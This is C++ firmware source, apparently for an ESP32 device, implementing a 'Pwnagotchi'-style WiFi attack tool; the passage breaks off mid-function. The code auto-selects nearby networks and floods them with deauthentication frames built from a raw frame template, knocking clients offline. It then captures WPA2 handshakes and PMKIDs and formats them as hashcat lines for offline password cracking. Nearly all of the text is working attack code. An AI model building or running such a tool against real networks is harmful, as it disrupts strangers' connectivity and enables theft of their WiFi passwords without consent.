/*
 * ESPPwnagotchi — see header.
 */

#include "esppwnagotchi.h"
#include "target_list.h"
#include "wificonfig.h"
#include "utils.h"
#include "Touchscreen.h"

#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_random.h>
#include <SD.h>
#include <SPI.h>
#include <Preferences.h>
#include <string.h>

#define DARK_GRAY 0x4208

#define BTN_UP     6
#define BTN_DOWN   3
#define BTN_LEFT   4
#define BTN_RIGHT  5

namespace EspPwnagotchi {

// ─── Frame templates ────────────────────────────────────────────────────────

// Deauth (26 bytes) — broadcast to BSSID's clients
static uint8_t deauth_frame[26] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x02, 0x00
};

// (CSA frame templates removed — CSA was lure-only and didn't help with
// PMKID/handshake capture. Deauth alone forces re-association.)

// ─── EAPOL capture ring buffer ──────────────────────────────────────────────

// EAPOL frame copy buffer. M3 carries GTK ~155B; M1 with RSN+PMKID KDE can
// reach 180B. We size the per-slot copy at 160 (saves DRAM) — PMKID is
// extracted IN THE CALLBACK against the full untruncated payload, so the
// truncation only affects the PCAP write, not PMKID harvest.
#define EAPOL_MAX_FRAME 160
// 3 slots (was 4) frees DRAM for the small PmkidEntry queue below.
#define EAPOL_RING_SLOTS 3

struct CapFrame {
  uint16_t len;
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint8_t  data[EAPOL_MAX_FRAME];
};

static volatile CapFrame ring[EAPOL_RING_SLOTS];
static volatile uint8_t ringHead = 0;
static volatile uint8_t ringTail = 0;
static portMUX_TYPE ringMux = portMUX_INITIALIZER_UNLOCKED;
static volatile uint32_t eapolSeenIsr = 0;

// Separate queue for PMKID hits extracted in the sniffer callback against
// the FULL untruncated payload. The PCAP ring's 160-byte copy chops the
// tail of M1 (where the PMKID KDE lives) — we grab it here before the chop.
struct PmkidEntry {
  uint8_t pmkid[16];
  uint8_t apMac[6];
  uint8_t staMac[6];
};
#define PMKID_Q_SLOTS 4
static volatile PmkidEntry pmkidQ[PMKID_Q_SLOTS];
static volatile uint8_t pmkidQHead = 0;
static volatile uint8_t pmkidQTail = 0;
static portMUX_TYPE pmkidQMux = portMUX_INITIALIZER_UNLOCKED;

// Pending M1 entries waiting for the matching M2. We need both halves to
// emit a hashcat WPA*02 (full-handshake) line: ANonce comes from M1, MIC
// + EAPOL frame come from M2. Match by (AP MAC, STA MAC). 2 slots is
// enough — pairs typically resolve within ~200ms of M1 arriving.
struct PendingM1 {
  uint8_t  apMac[6];
  uint8_t  staMac[6];
  uint8_t  anonce[32];
  uint32_t timestamp;       // millis() when M1 was seen, for aging out stale entries
  bool     used;            // false = slot free
};
#define PENDING_M1_SLOTS 2
static PendingM1 pendingM1Table[PENDING_M1_SLOTS];
// Dedupe table for handshakes already written (keyed by AP MAC). FIFO of 8.
#define HSK_DEDUPE 8
static uint8_t hskSeenBssid[HSK_DEDUPE][6];
static uint8_t hskSeenIdx = 0;
static uint8_t hskSeenCount = 0;

// ─── Stats ──────────────────────────────────────────────────────────────────

// CSA phase removed — deauth alone forces re-association which gives us M1.
enum Phase { PH_IDLE = 0, PH_DEAUTH = 1, PH_LISTEN = 3, PH_SCAN = 4 };

static bool      attackActive = false;
static int       cursor = 0;          // target index being worked on
static Phase     phase = PH_IDLE;
static uint32_t  phaseStartedAt = 0;
static uint32_t  totalDeauth = 0;
static uint32_t  totalEapol = 0;
static uint32_t  totalM1 = 0;       // EAPOL frames identified as M1 (PMKID candidates)
static uint32_t  totalPmkid = 0;    // M1s where a PMKID KDE was actually present
static uint32_t  totalHandshake = 0;  // M1+M2 pairs written to .22000 as WPA*02
static uint32_t  totalDropped = 0;

// Dedupe table for PMKIDs already written to the hashcat file. Keyed by
// BSSID — once we've extracted a PMKID for an AP we don't write it again.
// 8 slots is enough for a typical single session; old entries roll over.
#define PMKID_DEDUPE 8
static uint8_t pmkidSeenBssid[PMKID_DEDUPE][6];
static uint8_t pmkidSeenIdx = 0;
static uint8_t pmkidSeenCount = 0;
static uint32_t  lastUiUpdate = 0;
static uint32_t  lastBtnMs = 0;
static uint32_t  lastBtnDownMs = 0;
static const uint32_t BTN_DEBOUNCE_MS = 200;
static bool toggleHeldFromPrev = true;
static bool downHeldFromPrev = true;
static bool leftHeldFromPrev = true;
static bool rightHeldFromPrev = true;
static uint32_t lastBtnLeftMs = 0;
static uint32_t lastBtnRightMs = 0;

// Persistent exclude list — SSIDs that should never be attacked even when
// the auto-scan would otherwise select them. Stored in NVS under namespace
// "esppwn", keys "ex_n" (count) and "ex_0".."ex_<n-1>" (SSID strings).
// Tight on DRAM: 4 slots is enough for "my home + my office + a couple
// friends". When full, FIFO eviction drops the oldest.
#define MAX_EXCLUDES      4
#define EXCLUDE_SSID_MAX  24
static char excludeList[MAX_EXCLUDES][EXCLUDE_SSID_MAX + 1];
static int  excludeCount = 0;

// Auto-scan state. 25s gives ~5 full sweeps across channels 1–11 with a
// 400ms dwell — enough time for sparse-beaconing APs (default beacon
// interval is 100ms but some routers stretch it to 300–1000ms) to be heard
// at least once on their channel. User can press DOWN again mid-scan to
// finish early and start the attack rotation immediately.
static uint8_t   scanChannel = 1;
static uint32_t  scanLastHopMs = 0;
static uint32_t  scanLastFoundMs = 0;          // ms of last "new AP found" event
static int       scanLastFoundCount = 0;       // targetCount snapshot for change-detect
static const uint32_t SCAN_HOP_DWELL_MS = 400;
static const uint32_t SCAN_DURATION_MS  = 25000;

// Per-phase duration (ms). DEAUTH burst, then LISTEN that extends every
// time an EAPOL frame arrives from this target (handshake in progress —
// stay until it's done) up to a hard cap.
static const uint32_t DEAUTH_MS         = 1200;
static const uint32_t LISTEN_BASE_MS    = 5000;   // always wait at least this long
static const uint32_t LISTEN_QUIET_MS   = 3000;   // ...then wait this long after the LAST EAPOL before moving on
static const uint32_t LISTEN_MAX_MS     = 15000;  // hard cap so a flooded target can't pin the rotation

// Tracks the millis() of the most recent EAPOL frame we drained from the
// ring. The LISTEN phase uses it to extend on activity (see pwnLoop).
static volatile uint32_t lastEapolDrainMs = 0;

// Per-target capture counters, parallel-indexed with TargetList::targets[].
// We don't extend the shared AccessPoint struct because these are ESPPwn-
// specific. Reset when ESPPwn starts an auto-scan (which also clears the
// TargetList) and when the feature first enters setup.
struct PerTargetStats {
  uint16_t eapol;       // total EAPOL frames seen for this BSSID
  uint8_t  m1;          // total M1 frames identified
  uint8_t  pmkid;       // 1 if a PMKID has been written for this BSSID, else 0
  uint8_t  handshake;   // 1 if an M1+M2 pair (WPA*02) has been written, else 0
};
static volatile PerTargetStats perTarget[HYDRA_MAX_TARGET_APS];

static void resetPerTargetStats() {
  for (int i = 0; i < HYDRA_MAX_TARGET_APS; i++) {
    perTarget[i].eapol     = 0;
    perTarget[i].m1        = 0;
    perTarget[i].pmkid     = 0;
    perTarget[i].handshake = 0;
  }
}

// Locate the TargetList entry by BSSID. Returns -1 if not in the list.
// Called from both IRAM (sniffer) and main-loop contexts — kept small.
static int findTargetIdxByBssid(const uint8_t* bssid) {
  int n = TargetList::targetCount;
  for (int i = 0; i < n; i++) {
    const uint8_t* b = TargetList::targets[i].bssid;
    if (b[0] == bssid[0] && b[1] == bssid[1] && b[2] == bssid[2] &&
        b[3] == bssid[3] && b[4] == bssid[4] && b[5] == bssid[5]) return i;
  }
  return -1;
}

// ─── PCAP file ──────────────────────────────────────────────────────────────

static File pcapFile;
static bool pcapOpen = false;
static bool sdOk = false;
static char pcapPath[40] = {0};

#define PCAP_MAGIC      0xA1B2C3D4
#define PCAP_VER_MAJOR  2
#define PCAP_VER_MINOR  4
#define PCAP_SNAPLEN    65535
#define PCAP_LINKTYPE   105  // LINKTYPE_IEEE802_11

// Forward decl — writeTargetsSidecar is defined later but openPcap calls it.
static void writeTargetsSidecar();

static bool openPcap() {
  if (pcapOpen) {
    pcapFile.flush();
    pcapFile.close();
    pcapOpen = false;
  }
  if (!sdOk) return false;
  if (!SD.exists("/handshakes")) {
    SD.mkdir("/handshakes");
  }
  for (int i = 0; i < 9999; i++) {
    snprintf(pcapPath, sizeof(pcapPath), "/handshakes/cap_%04d.pcap", i);
    if (!SD.exists(pcapPath)) break;
  }
  pcapFile = SD.open(pcapPath, FILE_WRITE);
  if (!pcapFile) return false;

  uint32_t magic = PCAP_MAGIC;
  uint16_t vmaj = PCAP_VER_MAJOR, vmin = PCAP_VER_MINOR;
  int32_t  thiszone = 0;
  uint32_t sigfigs = 0;
  uint32_t snaplen = PCAP_SNAPLEN;
  uint32_t network = PCAP_LINKTYPE;

  pcapFile.write((uint8_t*)&magic, 4);
  pcapFile.write((uint8_t*)&vmaj, 2);
  pcapFile.write((uint8_t*)&vmin, 2);
  pcapFile.write((uint8_t*)&thiszone, 4);
  pcapFile.write((uint8_t*)&sigfigs, 4);
  pcapFile.write((uint8_t*)&snaplen, 4);
  pcapFile.write((uint8_t*)&network, 4);
  pcapFile.flush();
  pcapOpen = true;
  Serial.printf("[ESPPwn] PCAP opened: %s\n", pcapPath);
  // Pre-create the hashcat output file so the first PMKID/handshake write
  // path is a straightforward append. Works around an ESP32 Arduino SD
  // library quirk where FILE_APPEND doesn't create on first open.
  if (!SD.exists("/handshakes/pmkid.22000")) {
    File h = SD.open("/handshakes/pmkid.22000", FILE_WRITE);
    if (h) {
      h.close();
      Serial.println("[ESPPwn] pre-created /handshakes/pmkid.22000");
    } else {
      Serial.println("[ESPPwn] WARNING: could not pre-create pmkid.22000");
    }
  }
  // Sidecar text file with BSSID/SSID mapping for any targets already in
  // the list (e.g. from a prior AP Scan & Select). The auto-scan path
  // re-writes this after it finishes populating.
  if (TargetList::targetCount > 0) writeTargetsSidecar();
  return true;
}

static void closePcap() {
  if (pcapOpen) {
    pcapFile.flush();
    pcapFile.close();
    pcapOpen = false;
    Serial.printf("[ESPPwn] PCAP closed: %s (%u EAPOL frames)\n",
                  pcapPath, (unsigned)totalEapol);
  }
}

static void writeFrameToPcap(const CapFrame& f) {
  if (!pcapOpen) return;
  uint32_t ts_sec  = f.ts_sec;
  uint32_t ts_usec = f.ts_usec;
  uint32_t incl_len = f.len;
  uint32_t orig_len = f.len;
  pcapFile.write((uint8_t*)&ts_sec, 4);
  pcapFile.write((uint8_t*)&ts_usec, 4);
  pcapFile.write((uint8_t*)&incl_len, 4);
  pcapFile.write((uint8_t*)&orig_len, 4);
  pcapFile.write((const uint8_t*)f.data, f.len);
}

// ─── Promisc RX callback — runs in WiFi driver task, keep IRAM-safe ─────────

static inline bool isEapolDataFrame(const uint8_t* p, int len, int& bodyOff) {
  if (len < 32) return false;
  uint8_t fc0 = p[0];
  uint8_t fc1 = p[1];
  // type = (fc0 >> 2) & 0x3, must be 2 (Data)
  if (((fc0 >> 2) & 0x3) != 2) return false;
  // Skip protected frames (encrypted data — never an EAPOL handshake M1..M4)
  if (fc1 & 0x40) return false;
  uint8_t subtype = (fc0 >> 4) & 0xF;
  // Data subtypes 0..7 = non-QoS, 8..15 = QoS. Null-data (4, 12) carry no body.
  if (subtype == 4 || subtype == 12) return false;
  bool qos = (subtype >= 8);
  bool toDS   = (fc1 & 0x01) != 0;
  bool fromDS = (fc1 & 0x02) != 0;
  bool wds = (toDS && fromDS);
  int hdr = 24 + (wds ? 6 : 0) + (qos ? 2 : 0);
  if (len < hdr + 8 + 2) return false;
  const uint8_t* llc = p + hdr;
  // LLC/SNAP: AA AA 03 00 00 00 then ethertype
  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
        llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00)) return false;
  if (!(llc[6] == 0x88 && llc[7] == 0x8E)) return false;
  bodyOff = hdr + 8;
  return true;
}

// Forward decl — pwnSniffer is defined after this block but switchToCaptureMode
// references it.
static void IRAM_ATTR pwnSniffer(void* buf, wifi_promiscuous_pkt_type_t type);

// ─── Scan mode: mgmt-frame sniffer that populates TargetList ────────────────
// Lifted from ap_scan.cpp's classifier + parser, condensed. Only runs while
// phase == PH_SCAN; pwnSniffer above only handles PH_DEAUTH/CSA/LISTEN data.

static uint8_t classifyAuthFromBeacon(const uint8_t* payload, int len, uint16_t capab) {
  bool privacy = (capab & 0x10) != 0;
  if (!privacy) return TargetList::AUTH_OPEN;
  if (len < 38) return TargetList::AUTH_WEP;
  int pos = 36 + payload[37] + 2;
  bool sawRSN = false, sawWPA = false, sawSAE = false;
  while (pos + 2 < len) {
    uint8_t tag = payload[pos];
    uint8_t tlen = payload[pos + 1];
    if (pos + 2 + tlen > len) break;
    if (tag == 0x30) {
      sawRSN = true;
      const uint8_t* rsn = payload + pos + 2;
      if (tlen >= 14) {
        uint16_t akmCount = (uint16_t)rsn[12] | ((uint16_t)rsn[13] << 8);
        for (int k = 0; k < akmCount && (14 + 4 * (k + 1)) <= tlen; k++) {
          if (rsn[14 + 4 * k + 3] == 8) sawSAE = true;
        }
      }
    } else if (tag == 0xdd && tlen >= 4) {
      if (payload[pos + 2] == 0x00 && payload[pos + 3] == 0x50 &&
          payload[pos + 4] == 0xF2 && payload[pos + 5] == 0x01) {
        sawWPA = true;
      }
    }
    pos += tlen + 2;
  }
  if (sawSAE) return TargetList::AUTH_WPA3;
  if (sawRSN) return TargetList::AUTH_WPA2;
  if (sawWPA) return TargetList::AUTH_WPA;
  return TargetList::AUTH_WEP;
}

static void IRAM_ATTR scanSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!buf || type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 38) return;
  if (payload[0] != 0x80 && payload[0] != 0x50) return;  // Beacon / Probe Resp
  uint16_t capab = (uint16_t)payload[34] | ((uint16_t)payload[35] << 8);
  uint8_t auth = classifyAuthFromBeacon(payload, len, capab);
  uint8_t ssidLen = payload[37];
  if (ssidLen > 32) ssidLen = 32;
  if (38 + ssidLen > len) return;
  TargetList::addOrUpdate(payload + 10, (const char*)(payload + 38), ssidLen,
                          pkt->rx_ctrl.rssi, pkt->rx_ctrl.channel, auth);
}

static void switchToScanMode() {
  esp_wifi_set_promiscuous(false);
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&scanSniffer);
  esp_wifi_set_promiscuous(true);
}

static void switchToCaptureMode() {
  esp_wifi_set_promiscuous(false);
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&pwnSniffer);
  esp_wifi_set_promiscuous(true);
}

// Write a sidecar text file next to the PCAP so handshakes can be matched
// back to network names after pulling the SD card. Called when a scan
// finishes and any time the user manually re-runs scan.
static void writeTargetsSidecar() {
  if (!sdOk || pcapPath[0] == '\0') return;
  char sidePath[48];
  strncpy(sidePath, pcapPath, sizeof(sidePath) - 1);
  sidePath[sizeof(sidePath) - 1] = '\0';
  char* dot = strrchr(sidePath, '.');
  if (dot) strcpy(dot, ".txt");
  else return;
  File f = SD.open(sidePath, FILE_WRITE);  // FILE_WRITE truncates+rewrites
  if (!f) return;
  f.printf("# ESPPwn capture targets — %s\n", pcapPath);
  f.printf("# uptime_ms=%u  totalEAP=%u  totalM1=%u  totalPMK=%u  totalHSK=%u\n",
           (unsigned)millis(),
           (unsigned)totalEapol, (unsigned)totalM1,
           (unsigned)totalPmkid, (unsigned)totalHandshake);
  f.printf("# BSSID            CH AUTH SSID                          EAP  M1 PMK HSK\n");
  for (int i = 0; i < TargetList::targetCount; i++) {
    const TargetList::AccessPoint& t = TargetList::targets[i];
    const char* authStr =
      t.auth == TargetList::AUTH_OPEN ? "OPEN" :
      t.auth == TargetList::AUTH_WEP  ? "WEP"  :
      t.auth == TargetList::AUTH_WPA  ? "WPA"  :
      t.auth == TargetList::AUTH_WPA2 ? "WPA2" :
      t.auth == TargetList::AUTH_WPA3 ? "WPA3" : "?";
    f.printf("%02x:%02x:%02x:%02x:%02x:%02x %2d %-4s %-28s %4u %3u  %s   %s\n",
             t.bssid[0], t.bssid[1], t.bssid[2], t.bssid[3],
             t.bssid[4], t.bssid[5],
             (int)t.channel, authStr, t.ssid,
             (unsigned)perTarget[i].eapol,
             (unsigned)perTarget[i].m1,
             perTarget[i].pmkid     ? "Y" : "-",
             perTarget[i].handshake ? "Y" : "-");
  }
  f.flush();
  f.close();
  Serial.printf("[ESPPwn] sidecar written: %s (%d targets)\n",
                sidePath, TargetList::targetCount);
}

// ─── Persistent exclude list ─────────────────────────────────────────────────

static void saveExcludeList() {
  Preferences p;
  if (!p.begin("esppwn", false)) return;
  p.putInt("ex_n", excludeCount);
  for (int i = 0; i < excludeCount; i++) {
    char key[8];
    snprintf(key, sizeof(key), "ex_%d", i);
    p.putString(key, excludeList[i]);
  }
  // Wipe any stale higher-index entries left over from a larger past list.
  for (int i = excludeCount; i < MAX_EXCLUDES; i++) {
    char key[8];
    snprintf(key, sizeof(key), "ex_%d", i);
    p.remove(key);
  }
  p.end();
}

static void loadExcludeList() {
  excludeCount = 0;
  Preferences p;
  if (!p.begin("esppwn", true)) return;
  int n = p.getInt("ex_n", 0);
  if (n > MAX_EXCLUDES) n = MAX_EXCLUDES;
  for (int i = 0; i < n; i++) {
    char key[8];
    snprintf(key, sizeof(key), "ex_%d", i);
    size_t got = p.getString(key, excludeList[excludeCount], EXCLUDE_SSID_MAX + 1);
    if (got > 0) excludeCount++;
  }
  p.end();
  Serial.printf("[ESPPwn] %d excludes loaded\n", excludeCount);
  for (int i = 0; i < excludeCount; i++) {
    Serial.printf("  [%d] %s\n", i, excludeList[i]);
  }
}

static bool isExcluded(const char* ssid) {
  if (!ssid || !ssid[0]) return false;
  // The "[hidden]" placeholder represents networks whose real SSID we never
  // saw — excluding by that string is meaningless. Skip.
  if (strcmp(ssid, "[hidden]") == 0) return false;
  for (int i = 0; i < excludeCount; i++) {
    if (strcmp(excludeList[i], ssid) == 0) return true;
  }
  return false;
}

static void addExclude(const char* ssid) {
  if (!ssid || !ssid[0]) return;
  if (strcmp(ssid, "[hidden]") == 0) return;
  if (isExcluded(ssid)) return;
  if (excludeCount >= MAX_EXCLUDES) {
    // FIFO eviction: drop oldest entry, shift the rest down.
    for (int i = 1; i < MAX_EXCLUDES; i++) {
      strcpy(excludeList[i - 1], excludeList[i]);
    }
    excludeCount = MAX_EXCLUDES - 1;
  }
  strncpy(excludeList[excludeCount], ssid, EXCLUDE_SSID_MAX);
  excludeList[excludeCount][EXCLUDE_SSID_MAX] = '\0';
  excludeCount++;
  saveExcludeList();
  Serial.printf("[ESPPwn] excluded: \"%s\" (now %d)\n", ssid, excludeCount);
}

static bool removeExclude(const char* ssid) {
  for (int i = 0; i < excludeCount; i++) {
    if (strcmp(excludeList[i], ssid) == 0) {
      for (int j = i + 1; j < excludeCount; j++) {
        strcpy(excludeList[j - 1], excludeList[j]);
      }
      excludeCount--;
      saveExcludeList();
      return true;
    }
  }
  return false;
}

static void clearExcludes() {
  excludeCount = 0;
  saveExcludeList();
  Serial.println("[ESPPwn] exclude list cleared");
}

// ─── PMKID extraction (hashcat -m 22000) ────────────────────────────────────
//
// PMKID is the PMK Identifier the AP advertises in the first EAPOL-Key frame
// (M1) of the 4-way handshake. Lives in the Key Data IE list as a KDE:
//   tag=0xDD  len=0x14  OUI=00:0F:AC  type=0x04  pmkid(16)
// Extracted clientlessly: any M1 sent by the AP after a (real or forced)
// reassociation includes it — so our existing deauth-then-listen cycle
// catches it as a side effect without any extra TX from us.

static bool ssidLookupForBssid(const uint8_t bssid[6], char* outSsid, int outCap) {
  for (int i = 0; i < TargetList::targetCount; i++) {
    if (memcmp(TargetList::targets[i].bssid, bssid, 6) == 0) {
      strncpy(outSsid, TargetList::targets[i].ssid, outCap - 1);
      outSsid[outCap - 1] = '\0';
      return true;
    }
  }
  return false;
}

static bool pmkidDedupeHit(const uint8_t bssid[6]) {
  for (int i = 0; i < pmkidSeenCount; i++) {
    if (memcmp(pmkidSeenBssid[i], bssid, 6) == 0) return true;
  }
  return false;
}

static void pmkidDedupeAdd(const uint8_t bssid[6]) {
  memcpy(pmkidSeenBssid[pmkidSeenIdx], bssid, 6);
  pmkidSeenIdx = (pmkidSeenIdx + 1) % PMKID_DEDUPE;
  if (pmkidSeenCount < PMKID_DEDUPE) pmkidSeenCount++;
}

// Parse a captured 802.11 frame for EAPOL M1 carrying a PMKID. Returns true
// and fills outPmkid/outApMac/outStaMac on success. The frame buffer must
// be a full 802.11 frame as captured by promisc mode.
static bool extractPMKID(const uint8_t* frame, int len,
                          uint8_t outPmkid[16],
                          uint8_t outApMac[6],
                          uint8_t outStaMac[6]) {
  if (len < 32) return false;
  uint8_t fc0 = frame[0];
  uint8_t fc1 = frame[1];
  if (((fc0 >> 2) & 0x3) != 2) return false;           // not Data
  if (fc1 & 0x40) return false;                        // protected (encrypted) — not M1
  uint8_t subtype = (fc0 >> 4) & 0xF;
  if (subtype == 4 || subtype == 12) return false;     // null-data, no body
  bool qos    = (subtype >= 8);
  bool toDS   = (fc1 & 0x01) != 0;
  bool fromDS = (fc1 & 0x02) != 0;
  bool wds    = (toDS && fromDS);
  int hdr = 24 + (wds ? 6 : 0) + (qos ? 2 : 0);
  if (len < hdr + 8) return false;
  // LLC/SNAP + EtherType 0x888E (EAPOL)
  const uint8_t* llc = frame + hdr;
  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03)) return false;
  if (!(llc[6] == 0x88 && llc[7] == 0x8E)) return false;
  // EAPOL header (4 bytes): version, type, length(BE)
  const uint8_t* eapol = frame + hdr + 8;
  int eapolLen = len - hdr - 8;
  if (eapolLen < 4 + 95) return false;
  if (eapol[1] != 0x03) return false;                  // type 3 = EAPOL-Key
  const uint8_t* keyBody = eapol + 4;
  int keyBodyLen = eapolLen - 4;
  if (keyBodyLen < 95) return false;
  if (keyBody[0] != 0x02) return false;                // descriptor 2 = RSN
  // Key Info big-endian: pairwise(b3), install(b6), ack(b7), mic(b8)
  uint16_t keyInfo = ((uint16_t)keyBody[1] << 8) | keyBody[2];
  // M1: pairwise=1, ack=1, install=0, mic=0. Mask = 0x01C8, value = 0x0088.
  if ((keyInfo & 0x01C8) != 0x0088) return false;
  // We've identified this as an M1 frame. Count it whether or not it ends up
  // carrying a PMKID, so the user can tell "no M1 seen" from "M1 seen but
  // the AP stripped PMKID".
  totalM1++;
  // Per-target M1 count. AP MAC = addr2 (offset 10) for AP→client frames.
  {
    int ti = findTargetIdxByBssid(frame + 10);
    if (ti < 0) ti = findTargetIdxByBssid(frame + 16);  // fall back to BSSID/addr3
    if (ti >= 0) perTarget[ti].m1++;
  }
  // Key Data Length at offset 93-94 in keyBody (big-endian)
  uint16_t kdLen = ((uint16_t)keyBody[93] << 8) | keyBody[94];
  if (kdLen < 22) return false;                        // need at least one PMKID KDE
  if (keyBodyLen < 95 + kdLen) return false;
  const uint8_t* kd = keyBody + 95;
  // Walk Key Data tags looking for PMKID KDE: DD 14 00 0F AC 04 <16 PMKID>
  int pos = 0;
  while (pos + 2 <= kdLen) {
    uint8_t tag = kd[pos];
    uint8_t tlen = kd[pos + 1];
    if (pos + 2 + tlen > kdLen) break;
    if (tag == 0xDD && tlen >= 20 &&
        kd[pos + 2] == 0x00 && kd[pos + 3] == 0x0F &&
        kd[pos + 4] == 0xAC && kd[pos + 5] == 0x04) {
      for (int k = 0; k < 16; k++) outPmkid[k] = kd[pos + 6 + k];
      // For M1 the AP→client direction has fromDS=1: addr1=client, addr2=AP, addr3=BSSID
      // For sane WPA2 networks addr2 == addr3. Use addr2 as AP MAC, addr1 as STA.
      for (int k = 0; k < 6; k++) {
        outApMac[k]  = frame[10 + k];
        outStaMac[k] = frame[4 + k];
      }
      return true;
    }
    pos += 2 + tlen;
  }
  return false;
}

// File-write outcomes. Counters in the UI only increment on WRITE_OK.
enum FileResult { WRITE_OK = 0, WRITE_NO_SD = 1, WRITE_OPEN_FAIL = 2 };
static uint32_t sdWriteErrors = 0;     // shown in UI so silent failures are visible

// Open `/handshakes/<name>` for append. Works around the ESP32 Arduino SD
// library quirk where SD.open(path, FILE_APPEND) returns invalid when the
// file does not yet exist (the FILE_APPEND wrapper passes create=false to
// the VFS layer). We pre-create with FILE_WRITE if needed, then reopen in
// append mode for the actual write. Falls back to FILE_WRITE+seek if even
// that fails (some SD libraries are unreliable with append on first-write).
static File openHashesAppend() {
  if (!SD.exists("/handshakes")) SD.mkdir("/handshakes");
  const char* path = "/handshakes/pmkid.22000";
  if (!SD.exists(path)) {
    File create = SD.open(path, FILE_WRITE);
    if (create) {
      create.close();
      Serial.printf("[ESPPwn] created %s\n", path);
    } else {
      Serial.printf("[ESPPwn] FAILED to create %s\n", path);
      return File();
    }
  }
  File f = SD.open(path, FILE_APPEND);
  if (!f) {
    // Fallback: open in write mode and manually seek to the end.
    f = SD.open(path, FILE_WRITE);
    if (f) f.seek(f.size());
  }
  return f;
}

static FileResult appendPmkidToFile(const uint8_t pmkid[16],
                                    const uint8_t apMac[6],
                                    const uint8_t staMac[6],
                                    const char* ssid) {
  if (!sdOk) {
    sdWriteErrors++;
    Serial.println("[ESPPwn] PMKID write skipped: SD not initialized");
    return WRITE_NO_SD;
  }
  File f = openHashesAppend();
  if (!f) {
    sdWriteErrors++;
    Serial.println("[ESPPwn] PMKID file open FAILED — /handshakes/pmkid.22000 not writable");
    return WRITE_OPEN_FAIL;
  }
  // Build SSID hex inline — at most 32 SSID bytes → 64 hex chars + null.
  char ssidHex[66];
  int hi = 0;
  for (int i = 0; ssid[i] && hi + 2 < (int)sizeof(ssidHex); i++) {
    static const char* H = "0123456789abcdef";
    ssidHex[hi++] = H[(uint8_t)ssid[i] >> 4];
    ssidHex[hi++] = H[(uint8_t)ssid[i] & 0xF];
  }
  ssidHex[hi] = '\0';
  // hashcat WPA-PMKID format (mode 22000):
  // WPA*01*<32-hex pmkid>*<12-hex ap>*<12-hex sta>*<hex essid>*<>*<>*<>
  f.printf("WPA*01*"
           "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x"
           "*%02x%02x%02x%02x%02x%02x"
           "*%02x%02x%02x%02x%02x%02x"
           "*%s***\n",
           pmkid[0], pmkid[1], pmkid[2],  pmkid[3],
           pmkid[4], pmkid[5], pmkid[6],  pmkid[7],
           pmkid[8], pmkid[9], pmkid[10], pmkid[11],
           pmkid[12], pmkid[13], pmkid[14], pmkid[15],
           apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
           staMac[0], staMac[1], staMac[2], staMac[3], staMac[4], staMac[5],
           ssidHex);
  f.flush();
  size_t writtenSize = f.size();
  f.close();
  Serial.printf("[ESPPwn] PMKID saved for %02x:%02x:%02x:%02x:%02x:%02x (%s) — file now %u bytes\n",
                apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
                ssid[0] ? ssid : "(unknown SSID)", (unsigned)writtenSize);
  return WRITE_OK;
}

// Called from pwnLoop after draining each ring slot. Cheap when the frame
// isn't M1 — early-outs on FC bits.
static void tryHarvestPmkid(const uint8_t* frame, int len) {
  uint8_t pmkid[16], apMac[6], staMac[6];
  if (!extractPMKID(frame, len, pmkid, apMac, staMac)) return;
  if (pmkidDedupeHit(apMac)) return;
  char ssid[33] = "";
  ssidLookupForBssid(apMac, ssid, sizeof(ssid));
  appendPmkidToFile(pmkid, apMac, staMac, ssid);
  pmkidDedupeAdd(apMac);
  totalPmkid++;
}

// ─── Full-handshake (M1+M2 → hashcat WPA*02) ────────────────────────────────
//
// Hashcat mode 22000 also accepts a "WPA*02*..." line built from an M1+M2
// pair: ANonce (from M1) + MIC + full EAPOL frame (from M2). This works
// for APs that don't expose PMKID — covers WPA2 networks where the only
// crackable artifact is the 4-way handshake itself.
//
// We extract from the PCAP ring's truncated 160-byte frames (the ANonce
// at byte 49 and the MIC at byte 113 are both well within 160), so this
// works regardless of how big the original frame was.

static bool hskDedupeHit(const uint8_t bssid[6]) {
  for (int i = 0; i < hskSeenCount; i++) {
    if (memcmp(hskSeenBssid[i], bssid, 6) == 0) return true;
  }
  return false;
}
static void hskDedupeAdd(const uint8_t bssid[6]) {
  memcpy(hskSeenBssid[hskSeenIdx], bssid, 6);
  hskSeenIdx = (hskSeenIdx + 1) % HSK_DEDUPE;
  if (hskSeenCount < HSK_DEDUPE) hskSeenCount++;
}

// Parse just the 802.11 header to locate EAPOL-Key body. Fills outEapolOff
// and outEapolLen on success. Returns the 16-bit Key Info value, or 0xFFFF
// on parse failure.
static uint16_t parseEapolKeyHeader(const uint8_t* frame, int len, int& outBodyOff, int& outBodyLen) {
  if (len < 32) return 0xFFFF;
  uint8_t fc0 = frame[0];
  uint8_t fc1 = frame[1];
  if (((fc0 >> 2) & 0x3) != 2) return 0xFFFF;
  if (fc1 & 0x40) return 0xFFFF;
  uint8_t subtype = (fc0 >> 4) & 0xF;
  if (subtype == 4 || subtype == 12) return 0xFFFF;
  bool qos    = (subtype >= 8);
  bool toDS   = (fc1 & 0x01) != 0;
  bool fromDS = (fc1 & 0x02) != 0;
  bool wds    = (toDS && fromDS);
  int hdr = 24 + (wds ? 6 : 0) + (qos ? 2 : 0);
  if (len < hdr + 8) return 0xFFFF;
  const uint8_t* llc = frame + hdr;
